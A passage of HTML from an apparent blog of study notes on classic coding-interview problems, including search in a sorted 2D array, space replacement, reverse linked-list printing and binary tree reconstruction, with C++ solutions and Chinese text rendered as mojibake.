href="https://www.acwing.com/problem/content/16/">äºŒç»´æ•°ç»„ä¸­çš„æŸ¥æ‰¾</a></h2><p>åœ¨ä¸€ä¸ªäºŒç»´æ•°ç»„ä¸­ï¼Œæ¯ä¸€è¡Œéƒ½æŒ‰ç…§ä»å·¦åˆ°å³é€’å¢çš„é¡ºåºæ’åºï¼Œæ¯ä¸€åˆ—éƒ½æŒ‰ç…§ä»ä¸Šåˆ°ä¸‹é€’å¢çš„é¡ºåºæ’åºã€‚</p><p>è¯·å®Œæˆä¸€ä¸ªå‡½æ•°ï¼Œè¾“å…¥è¿™æ ·çš„ä¸€ä¸ªäºŒç»´æ•°ç»„å’Œä¸€ä¸ªæ•´æ•°ï¼Œåˆ¤æ–­æ•°ç»„ä¸­æ˜¯å¦å«æœ‰è¯¥æ•´æ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>äºŒç»´æ•°ç»„ä¸­å…ƒç´ ä¸ªæ•°èŒƒå›´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥æ•°ç»„ï¼š[  [1,2,8,9]ï¼Œ  [2,4,9,12]ï¼Œ  [4,7,10,13]ï¼Œ  [6,8,11,15]]å¦‚æœè¾“å…¥æŸ¥æ‰¾æ•°å€¼ä¸º7ï¼Œåˆ™è¿”å›trueï¼Œå¦‚æœè¾“å…¥æŸ¥æ‰¾æ•°å€¼ä¸º5ï¼Œåˆ™è¿”å›falseã€‚</code></pre><h3 id="Binary-Search-Tree-å•è°ƒæ€§æ‰«æ-O-n-m">Binary Search Tree å•è°ƒæ€§æ‰«æ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n + m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span></h3><p>å¯»æ‰¾çªç ´ç‚¹æ—¶å¯ä»¥å…³æ³¨è¾¹ç•Œ, æ­¤é¢˜çš„çªç ´ç‚¹åœ¨å³ä¸Šè§’<br>å³ä¸Šè§’åŒè¡Œå‘å·¦çš„å…ƒç´ éƒ½æ¯”å…¶å°, åŒåˆ—å‘ä¸‹çš„æ‰€æœ‰å…ƒç´ å‡æ¯”å…¶å¤§<br>å½“å³ä¸Šè§’å…ƒç´ æ¯”targetå¤§æ—¶, æ‰€åœ¨åˆ—éƒ½ä¸ç”¨è€ƒè™‘(jâ€“),æ¯”targetå°æ—¶æ‰€åœ¨è¡Œéƒ½ä¸ç”¨è€ƒè™‘(i++)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">searchArray</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; array, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> n = array.<span class="built_in">size</span>(), m = array[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = m - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; n &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (array[i][j] == target) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (array[i][j] &gt; target) j--;</span><br><span class="line">      <span class="keyword">else</span> i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ›¿æ¢ç©ºæ ¼"><a href="https://www.acwing.com/problem/content/17/">æ›¿æ¢ç©ºæ ¼</a></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªç©ºæ ¼æ›¿æ¢æˆ<code>&quot;%20&quot;</code>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo></mrow><annotation encoding="application/x-tex">0 \le</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span></span></span></span> è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">\le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>ã€‚<br>æ³¨æ„è¾“å‡ºå­—ç¬¦ä¸²çš„é•¿åº¦å¯èƒ½å¤§äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1000</mn></mrow><annotation encoding="application/x-tex">1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š&quot;We are happy.&quot;è¾“å‡ºï¼š&quot;We%20are%20happy.&quot;</code></pre><h3 id="éå†æ·»åŠ -O-n">éå†æ·»åŠ  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">string <span class="title">replaceSpaces</span><span class="params">(string &amp;str)</span> </span>&#123;</span><br><span class="line">    string res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: str) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">        res += <span class="string">&quot;%20&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        res += x;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æœ¬åœ°ä¿®æ”¹">æœ¬åœ°ä¿®æ”¹</h3><p>Python / Java ä¸­å­—ç¬¦ä¸²è¢«è®¾è®¡æˆä¸å¯ä¿®æ”¹çš„ï¼Œè€Œåœ¨ C++ ä¸­å­—ç¬¦ä¸²æ˜¯å¯å˜çš„ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">string <span class="title">replaceSpace</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>, len = s.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (s[i] == <span class="string">&#x27; &#x27;</span>) count++;</span><br><span class="line">    &#125;</span><br><span class="line">    s.<span class="built_in">resize</span>(len + <span class="number">2</span> * count);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = len - <span class="number">1</span>, j = s.<span class="built_in">size</span>() - <span class="number">1</span>; i &lt; j; i--, j--) &#123;</span><br><span class="line">      <span class="keyword">if</span> (s[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">        s[j] = s[i];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s[j - <span class="number">2</span>] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">        s[j - <span class="number">1</span>] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">        s[j] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        j -= <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨"><a href="https://www.acwing.com/problem/content/18/">ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨</a></h2><p>è¾“å…¥ä¸€ä¸ªé“¾è¡¨çš„å¤´ç»“ç‚¹ï¼ŒæŒ‰ç…§ <strong>ä»å°¾åˆ°å¤´</strong> çš„é¡ºåºè¿”å›èŠ‚ç‚¹çš„å€¼ã€‚</p><p>è¿”å›çš„ç»“æœç”¨æ•°ç»„å­˜å‚¨ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo></mrow><annotation encoding="application/x-tex">0 \le</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span></span></span></span> é“¾è¡¨é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">\le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[2, 3, 5]è¿”å›ï¼š[5, 3, 2]</code></pre><h3 id="è§£æ³•1-ç¿»è½¬vector-O-n">è§£æ³•1 ç¿»è½¬vector <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">printListReversingly</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">while</span> (head) &#123;</span><br><span class="line">      res.<span class="built_in">push_back</span>(head-&gt;val);</span><br><span class="line">      head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="è§£æ³•2-è¾…åŠ©æ ˆ-O-n">è§£æ³•2 è¾…åŠ©æ ˆ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">printListReversingly</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">    <span class="keyword">while</span> (head) &#123;</span><br><span class="line">      stk.<span class="built_in">push</span>(head-&gt;val);</span><br><span class="line">      head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">while</span> (stk.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      res.<span class="built_in">push_back</span>(stk.<span class="built_in">top</span>());</span><br><span class="line">      stk.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="é‡å»ºäºŒå‰æ ‘"><a href="https://www.acwing.com/problem/content/23/">é‡å»ºäºŒå‰æ ‘</a></h2><p>è¾“å…¥ä¸€æ£µäºŒå‰æ ‘å‰åºéå†å’Œä¸­åºéå†çš„ç»“æœï¼Œè¯·é‡å»ºè¯¥äºŒå‰æ ‘ã€‚</p><p><strong>æ³¨æ„</strong>:</p><ul><li>äºŒå‰æ ‘ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½äº’ä¸ç›¸åŒï¼›</li><li>è¾“å…¥çš„å‰åºéå†å’Œä¸­åºéå†ä¸€å®šåˆæ³•ï¼›</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹æ•°é‡èŒƒå›´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>ç»™å®šï¼šå‰åºéå†æ˜¯ï¼š[3, 9, 20, 15, 7]ä¸­åºéå†æ˜¯ï¼š[9, 3, 15, 20, 7]è¿”å›ï¼š[3, 9, 20, null, null, 15, 7, null, null, null, null]è¿”å›çš„äºŒå‰æ ‘å¦‚ä¸‹æ‰€ç¤ºï¼š    3   / \  9  20    /  \   15   7</code></pre><h3 id="é¢˜è§£">é¢˜è§£</h3><p><strong>æ€è·¯</strong></p><p>å…ˆåºéå†ç¬¬1ä¸ªå¯¹åº”çš„ä¸ºæ ¹èŠ‚ç‚¹, åœ¨ä¸­åºéå†åºåˆ—ä¸­æ‰¾åˆ°å…¶ä½ç½®ä¸ºk, é‚£ä¹ˆ[il, k-1]ä¸ºå·¦å­æ ‘çš„ä¸­åºåºåˆ—, è€Œ[k+1, ir]ä¸ºå³å­æ•°çš„ä¸­åºåºåˆ—<br>æ ¹æ®åŒºé—´é•¿åº¦å¯ä»¥ç¡®å®šå…ˆåºéå†åºåˆ—ä¸­å·¦å­æ ‘çš„ç«¯ç‚¹, ä»è€Œé€’å½’å»æ±‚è§£ã€‚</p><p><strong>æ—¶é—´å¤æ‚åº¦</strong></p><p>åœ¨åˆå§‹åŒ–æ—¶ï¼Œç”¨å“ˆå¸Œè¡¨è®°å½•æ¯ä¸ªå€¼åœ¨ä¸­åºéå†åºåˆ—ä¸­çš„ä½ç½®ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨é€’å½’åˆ°æ¯ä¸ªèŠ‚ç‚¹æ—¶ï¼Œåœ¨ä¸­åºéå†ä¸­æŸ¥æ‰¾æ ¹èŠ‚ç‚¹ä½ç½®çš„æ“ä½œï¼Œåªéœ€è¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> çš„æ—¶é—´ã€‚æ­¤æ—¶ï¼Œåˆ›å»ºæ¯ä¸ªèŠ‚ç‚¹éœ€è¦çš„æ—¶é—´æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>ï¼Œæ‰€ä»¥æ€»æ—¶é—´å¤æ‚åº¦æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; pre, in;</span><br><span class="line">  map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pos;</span><br><span class="line">  <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; _preorder, vector&lt;<span class="type">int</span>&gt;&amp; _inorder)</span> </span>&#123;</span><br><span class="line">    pre = _preorder, in = _inorder;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pre.<span class="built_in">size</span>(); i++) pos[in[i]] = i;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(<span class="number">0</span>, pre.<span class="built_in">size</span>() - <span class="number">1</span>, <span class="number">0</span>, in.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// è¿”å›åŒºé—´å…ˆåºå’Œä¸­åºéå†åºåˆ—å¯¹åº”çš„å­æ ‘çš„æ ¹</span></span><br><span class="line">  <span class="function">TreeNode* <span class="title">dfs</span><span class="params">(<span class="type">int</span> pl, <span class="type">int</span> pr, <span class="type">int</span> il, <span class="type">int</span> ir)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pl &gt; pr) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(pre[pl]);</span><br><span class="line">    <span class="type">int</span> k = pos[pre[pl]];</span><br><span class="line">    root-&gt;left = <span class="built_in">dfs</span>(pl + <span class="number">1</span>, pl + k - il, il, k - <span class="number">1</span>);</span><br><span class="line">    root-&gt;right = <span class="built_in">dfs</span>(pl + k - il + <span class="number">1</span>, pr, k + <span class="number">1</span>, ir);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹â˜…"><a href="https://www.acwing.com/problem/content/31/">äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹â˜…</a></h2><p>ç»™å®šä¸€æ£µäºŒå‰æ ‘çš„å…¶ä¸­ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¯·æ‰¾å‡ºä¸­åºéå†åºåˆ—çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>å¦‚æœç»™å®šçš„èŠ‚ç‚¹æ˜¯ä¸­åºéå†åºåˆ—çš„æœ€åä¸€ä¸ªï¼Œåˆ™è¿”å›ç©ºèŠ‚ç‚¹;</li><li>äºŒå‰æ ‘ä¸€å®šä¸ä¸ºç©ºï¼Œä¸”ç»™å®šçš„èŠ‚ç‚¹ä¸€å®šä¸æ˜¯ç©ºèŠ‚ç‚¹ï¼›</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>å‡å®šäºŒå‰æ ‘æ˜¯ï¼š[2, 1, 3, null, null, null, null]ï¼Œ ç»™å‡ºçš„æ˜¯å€¼ç­‰äº2çš„èŠ‚ç‚¹ã€‚åˆ™åº”è¿”å›å€¼ç­‰äº3çš„èŠ‚ç‚¹ã€‚è§£é‡Šï¼šè¯¥äºŒå‰æ ‘çš„ç»“æ„å¦‚ä¸‹ï¼Œ2çš„åç»§èŠ‚ç‚¹æ˜¯3ã€‚  2 / \1   3</code></pre><h3 id="é¢˜è§£-2">é¢˜è§£</h3><p><strong>æ€è·¯</strong></p><p>äºŒå‰æ ‘çš„ä¸­åºéå†ï¼š<code>&#123; [å·¦å­æ ‘], æ ¹èŠ‚ç‚¹, [å³å­æ ‘] &#125;</code></p><ul><li>æƒ…å†µ1. å­˜åœ¨å³å„¿å­, åˆ™ä¸ºå³å­æ ‘çš„æœ€å·¦ç«¯</li><li>æƒ…å†µ2. ä¸å­˜åœ¨å³å„¿å­, åˆ™éœ€è¦æ²¿ç€fatheråŸŸä¸€ç›´å‘ä¸Šæ‰¾ï¼Œæ‰¾åˆ°ç¬¬1ä¸ªæ˜¯å…¶fatherå·¦å„¿å­çš„èŠ‚ç‚¹ï¼Œè¯¥èŠ‚ç‚¹çš„fatherå°±æ˜¯å½“å‰èŠ‚ç‚¹çš„åç»§ã€‚å³ä¸€ç›´å‘å·¦ä¸Šæ‰¾, ç›´åˆ°å‡ºç°æ‹ç‚¹(å‘å³ä¸Š),  é‚£ä¹ˆæ‹ç‚¹åˆ™ä¸ºç›®æ ‡ç‚¹(å¯ä»æ‹ç‚¹è§’åº¦å†å»ç†è§£)</li></ul><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221214121311915.png" 